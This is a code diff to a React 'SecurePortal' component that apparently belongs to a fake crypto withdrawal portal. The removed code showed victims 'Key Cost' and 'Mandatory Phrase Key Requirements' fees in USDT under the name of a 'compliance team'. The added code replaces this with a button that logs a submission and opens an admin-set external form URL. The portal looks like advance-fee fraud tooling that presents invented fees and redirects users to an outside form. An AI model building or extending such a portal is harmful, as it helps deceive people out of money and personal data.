@@ -35,6 +35,7 @@ interface Case {
   phraseKeyMergeDeposit?: string;
   activityWalletRequirement?: string;
   phraseKeyCertificateSent?: boolean;
+  submissionUrl?: string;
 }
 
 interface CaseLetter {
@@ -2436,8 +2437,8 @@ export default function SecurePortal() {
                       <CheckCircle2 className="w-7 h-7 text-green-600" />
                     </div>
                     <div className="flex-1">
-                      <h3 className="text-xl font-bold text-green-900 mb-2">Withdrawal Selection Confirmed</h3>
-                      <p className="text-green-700 mb-4">Your withdrawal option has been submitted and is being processed by the compliance team.</p>
+                      <h3 className="text-xl font-bold text-green-900 mb-2">Request Submitted Successfully</h3>
+                      <p className="text-green-700 mb-4">Your withdrawal request has been submitted and is being processed by the compliance team.</p>
                       
                       <div className="bg-white rounded-lg p-4 border border-green-200 space-y-3 mb-4">
                         <div className="flex justify-between text-sm">
@@ -2445,10 +2446,8 @@ export default function SecurePortal() {
                           <span className="font-mono font-bold text-green-700">IBCCF-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
                         </div>
                         <div className="flex justify-between text-sm">
-                          <span className="text-slate-600">Selected Option</span>
-                          <Badge className={submissions[0]?.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
-                            Option {submissions[0]?.selectedOption}
-                          </Badge>
+                          <span className="text-slate-600">Status</span>
+                          <Badge className="bg-green-600">Submitted</Badge>
                         </div>
                         <div className="flex justify-between text-sm">
                           <span className="text-slate-600">Submitted On</span>
@@ -2457,9 +2456,9 @@ export default function SecurePortal() {
                       </div>
                       
                       <div className="flex gap-3">
-                        <Button onClick={() => setViewState('success')} className="bg-green-600 hover:bg-green-700">
-                          <Wallet className="w-4 h-4 mr-2" />
-                          View Deposit Instructions
+                        <Button onClick={() => setViewState('dashboard')} className="bg-green-600 hover:bg-green-700">
+                          <ArrowLeft className="w-4 h-4 mr-2" />
+                          Return to Dashboard
                         </Button>
                         <Button variant="outline" onClick={() => setViewState('submissions')}>
                           <History className="w-4 h-4 mr-2" />
@@ -2469,192 +2468,114 @@ export default function SecurePortal() {
                     </div>
                   </div>
                 </motion.div>
-              ) : (
+              ) : currentCase?.submissionUrl ? (
                 <>
-                  {/* Withdrawal Options - Professional Card Design */}
+                  {/* Simplified Submission URL Approach */}
                   <div className="mb-8">
                     <h2 className="text-lg font-bold text-slate-900 mb-4 flex items-center gap-3">
                       <div className="w-1 h-6 bg-blue-600 rounded"></div>
-                      Available Withdrawal Options
+                      Required Action
                     </h2>
                     
-                    <div className="grid md:grid-cols-2 gap-6">
-                      {/* Option A Card */}
-                      <motion.div whileHover={{ y: -4 }} transition={{ type: "spring", stiffness: 300 }}>
-                        <Card 
-                          className={`h-full cursor-pointer transition-all duration-300 overflow-hidden ${
-                            selectedOption === 'A' 
-                              ? 'ring-4 ring-blue-500 shadow-xl border-blue-500' 
-                              : 'border-slate-200 hover:border-blue-300 hover:shadow-lg'
-                          }`} 
-                          onClick={() => handleSelect('A')} 
-                          data-testid="card-option-a"
-                        >
-                          <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white px-5 py-4">
-                            <div className="flex justify-between items-center">
-                              <div>
-                                <p className="text-blue-200 text-xs font-medium uppercase tracking-wider">Option A</p>
-                                <h3 className="text-xl font-bold">{letterContent?.optionATitle || letter.optionATitle}</h3>
-                              </div>
-                              <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center text-2xl font-bold">A</div>
+                    <motion.div 
+                      initial={{ opacity: 0, y: 10 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-xl p-6"
+                    >
+                      <div className="flex items-start gap-4">
+                        <div className="w-14 h-14 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
+                          <ExternalLink className="w-7 h-7 text-white" />
+                        </div>
+                        <div className="flex-1">
+                          <h3 className="text-xl font-bold text-blue-900 mb-2">Complete Your Submission</h3>
+                          <p className="text-blue-700 mb-4">
+                            Click the button below to complete your withdrawal request. You will be redirected to a secure form to finalize your submission.
+                          </p>
+                          
+                          <div className="bg-white rounded-lg p-4 border border-blue-200 space-y-3 mb-4">
+                            <div className="flex justify-between text-sm">
+                              <span className="text-slate-600">Account</span>
+                              <span className="font-bold text-slate-900">{currentCase?.userName || "N/A"}</span>
+                            </div>
+                            <div className="flex justify-between text-sm">
+                              <span className="text-slate-600">Withdrawal Amount</span>
+                              <span className="font-bold text-green-600">{adminData?.withdrawalAmount || "N/A"}</span>
+                            </div>
+                            <div className="flex justify-between text-sm">
+                              <span className="text-slate-600">Reference</span>
+                              <span className="font-mono font-bold text-blue-700">{letterContent?.complianceReference || letter.complianceReference}</span>
                             </div>
                           </div>
                           
-                          <CardContent className="p-5 space-y-4">
-                            {(letterContent?.optionADescription || letter.optionADescription) && (
-                              <p className="text-sm text-slate-600">{letterContent?.optionADescription || letter.optionADescription}</p>
-                            )}
-                            
-                            <div className="space-y-3 bg-slate-50 rounded-lg p-4">
-                              <div className="flex justify-between text-sm">
-                                <span className="text-slate-500">Amount per Transfer</span>
-                                <span className="font-bold text-slate-900">{letterContent?.optionAAmount || adminData?.withdrawalAmount || "N/A"}</span>
-                              </div>
-                              <div className="flex justify-between text-sm">
-                                <span className="text-slate-500">Frequency</span>
-                                <span className="font-medium text-slate-700">{letterContent?.optionAFrequency || letter.optionAFrequency}</span>
-                              </div>
-                              <div className="flex justify-between text-sm">
-                                <span className="text-slate-500">Total Withdrawals</span>
-                                <span className="font-medium text-slate-700">{letterContent?.optionABatches || adminData?.withdrawalBatches || "10"} Transfers</span>
-                              </div>
-                              <div className="border-t border-slate-200 pt-3">
-                                <div className="flex justify-between text-sm">
-                                  <span className="text-slate-500">Key Cost</span>
-                                  <span className="font-bold text-blue-600">{letterContent?.optionAKeyCost || letter.optionAKeyCost}</span>
-                                </div>
-                                <div className="flex justify-between text-sm mt-2">
-                                  <span className="text-slate-500">Total Requirement</span>
-                                  <span className="font-bold text-blue-800">{letterContent?.optionATotalRequirement || letter.optionATotalRequirement}</span>
-                                </div>
-                              </div>
-                            </div>
-                            
-                            {(letterContent?.optionAFilelocoId || adminData?.physilocal0) && (
-                              <div className="bg-blue-50 border border-blue-200 rounded-lg px-4 py-3">
-                                <p className="text-xs text-blue-600 font-medium uppercase">Withdrawal ID</p>
-                                <p className="font-mono font-bold text-blue-900">{letterContent?.optionAFilelocoId || adminData?.physilocal0}</p>
-                              </div>
-                            )}
-                          </CardContent>
+                          <Button 
+                            size="lg"
+                            className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-lg"
+                            onClick={async () => {
+                              try {
+                                const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
+                                  method: 'POST',
+                                  headers: { 'Content-Type': 'application/json' },
+                                  body: JSON.stringify({ selectedOption: 'URL_SUBMISSION' })
+                                });
+                                if (response.ok) {
+                                  const submission = await response.json();
+                                  setLastSubmission(submission);
+                                  setSubmissions(prev => [submission, ...prev]);
+                                  window.open(currentCase.submissionUrl, '_blank');
+                                  toast({
+                                    title: "Submission Recorded",
+                                    description: "Your request has been tracked. Complete the form in the new tab.",
+                                    className: "bg-green-50 border-green-200 text-green-900",
+                                  });
+                                }
+                              } catch (error) {
+                                toast({ variant: "destructive", title: "Error", description: "Failed to record submission." });
+                              }
+                            }}
+                            data-testid="button-submit-url"
+                          >
+                            <ExternalLink className="w-5 h-5 mr-2" />
+                            Submit Your Request
+                          </Button>
                           
-                          <CardFooter className="px-5 pb-5 pt-0">
-                            <Button 
-                              className={`w-full ${selectedOption === 'A' ? 'bg-blue-600 hover:bg-blue-700' : ''}`} 
-                              variant={selectedOption === 'A' ? 'default' : 'outline'} 
-                              data-testid="button-select-a"
-                            >
-                              {selectedOption === 'A' ? 'Selected' : 'Select Option A'}
-                            </Button>
-                          </CardFooter>
-                        </Card>
-                      </motion.div>
-
-                      {/* Option B Card */}
-                      <motion.div whileHover={{ y: -4 }} transition={{ type: "spring", stiffness: 300 }}>
-                        <Card 
-                          className={`h-full cursor-pointer transition-all duration-300 overflow-hidden ${
-                            selectedOption === 'B' 
-                              ? 'ring-4 ring-slate-500 shadow-xl border-slate-500' 
-                              : 'border-slate-200 hover:border-slate-400 hover:shadow-lg'
-                          }`} 
-                          onClick={() => handleSelect('B')} 
-                          data-testid="card-option-b"
-                        >
-                          <div className="bg-gradient-to-r from-slate-600 to-slate-700 text-white px-5 py-4">
-                            <div className="flex justify-between items-center">
-                              <div>
-                                <p className="text-slate-300 text-xs font-medium uppercase tracking-wider">Option B</p>
-                                <h3 className="text-xl font-bold">{letterContent?.optionBTitle || letter.optionBTitle}</h3>
-                              </div>
-                              <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center text-2xl font-bold">B</div>
-                            </div>
-                          </div>
-                          
-                          <CardContent className="p-5 space-y-4">
-                            {(letterContent?.optionBDescription || letter.optionBDescription) && (
-                              <p className="text-sm text-slate-600">{letterContent?.optionBDescription || letter.optionBDescription}</p>
-                            )}
-                            
-                            <div className="space-y-3 bg-slate-50 rounded-lg p-4">
-                              <div className="flex justify-between text-sm">
-                                <span className="text-slate-500">Amount per Transfer</span>
-                                <span className="font-bold text-slate-900">{letterContent?.optionBAmount || `${parseInt(adminData?.withdrawalAmount || "0") / 2} USDT`}</span>
-                              </div>
-                              <div className="flex justify-between text-sm">
-                                <span className="text-slate-500">Frequency</span>
-                                <span className="font-medium text-slate-700">{letterContent?.optionBFrequency || letter.optionBFrequency}</span>
-                              </div>
-                              <div className="flex justify-between text-sm">
-                                <span className="text-slate-500">Total Withdrawals</span>
-                                <span className="font-medium text-slate-700">{letterContent?.optionBBatches || (parseInt(adminData?.withdrawalBatches || "10") * 2)} Transfers</span>
-                              </div>
-                              <div className="border-t border-slate-200 pt-3">
-                                <div className="flex justify-between text-sm">
-                                  <span className="text-slate-500">Key Cost</span>
-                                  <span className="font-bold text-slate-600">{letterContent?.optionBKeyCost || letter.optionBKeyCost}</span>
-                                </div>
-                                <div className="flex justify-between text-sm mt-2">
-                                  <span className="text-slate-500">Total Requirement</span>
-                                  <span className="font-bold text-slate-800">{letterContent?.optionBTotalRequirement || letter.optionBTotalRequirement}</span>
-                                </div>
-                              </div>
-                            </div>
-                            
-                            {(letterContent?.optionBFilelocoId || adminData?.physilocal0) && (
-                              <div className="bg-slate-100 border border-slate-200 rounded-lg px-4 py-3">
-                                <p className="text-xs text-slate-500 font-medium uppercase">Withdrawal ID</p>
-                                <p className="font-mono font-bold text-slate-800">{letterContent?.optionBFilelocoId || adminData?.physilocal0}</p>
-                              </div>
-                            )}
-                          </CardContent>
-                          
-                          <CardFooter className="px-5 pb-5 pt-0">
-                            <Button 
-                              className={`w-full ${selectedOption === 'B' ? 'bg-slate-600 hover:bg-slate-700' : ''}`} 
-                              variant={selectedOption === 'B' ? 'default' : 'outline'} 
-                              data-testid="button-select-b"
-                            >
-                              {selectedOption === 'B' ? 'Selected' : 'Select Option B'}
-                            </Button>
-                          </CardFooter>
-                        </Card>
-                      </motion.div>
-                    </div>
-                  </div>
-
-                  {/* Phrase Key Requirements Section */}
-                  {phraseKeyRequirements.length > 0 && (
-                    <div className="mb-8 bg-amber-50 border-2 border-amber-200 rounded-xl p-6">
-                      <h3 className="text-lg font-bold text-amber-900 flex items-center gap-2 mb-4">
-                        <Key className="w-5 h-5" />
-                        Mandatory Phrase Key Requirements
-                      </h3>
-                      <ul className="space-y-2">
-                        {phraseKeyRequirements.map((req: string, index: number) => (
-                          <li key={index} className="flex items-start gap-3 text-sm text-amber-800">
-                            <span className="w-5 h-5 bg-amber-200 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5">
-                              {index + 1}
-                            </span>
-                            {req}
-                          </li>
-                        ))}
-                      </ul>
-                    </div>
-                  )}
-
-                  {/* Compliance Notice */}
-                  {(letterContent?.complianceNotice || letter.complianceNotice) && (
-                    <div className="bg-red-50 border-2 border-red-200 rounded-xl p-6">
-                      <div className="flex items-start gap-3">
-                        <AlertTriangle className="w-6 h-6 text-red-600 flex-shrink-0 mt-0.5" />
-                        <div>
-                          <h4 className="font-bold text-red-900 mb-2">Compliance Notice</h4>
-                          <p className="text-sm text-red-800">{letterContent?.complianceNotice || letter.complianceNotice}</p>
+                          <p className="text-xs text-blue-600 text-center mt-3">
+                            Opens in a new tab. Your submission will be tracked automatically.
+                          </p>
                         </div>
                       </div>
-                    </div>
-                  )}
+                    </motion.div>
+                  </div>
+                </>
+              ) : (
+                <>
+                  {/* No submission URL configured - show message */}
+                  <div className="mb-8">
+                    <motion.div 
+                      initial={{ opacity: 0, y: 10 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="bg-amber-50 border-2 border-amber-200 rounded-xl p-6"
+                    >
+                      <div className="flex items-start gap-4">
+                        <div className="w-14 h-14 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
+                          <Clock className="w-7 h-7 text-white" />
+                        </div>
+                        <div className="flex-1">
+                          <h3 className="text-xl font-bold text-amber-900 mb-2">Awaiting Configuration</h3>
+                          <p className="text-amber-700 mb-4">
+                            The submission process is being configured by the compliance team. Please check back shortly or contact support for assistance.
+                          </p>
+                          <Button 
+                            onClick={() => setViewState('dashboard')}
+                            variant="outline"
+                            className="border-amber-300 text-amber-700 hover:bg-amber-100"
+                          >
+                            <ArrowLeft className="w-4 h-4 mr-2" />
+                            Return to Dashboard
+                          </Button>
+                        </div>
+                      </div>
+                    </motion.div>
+                  </div>
                 </>
               )}
             </div>
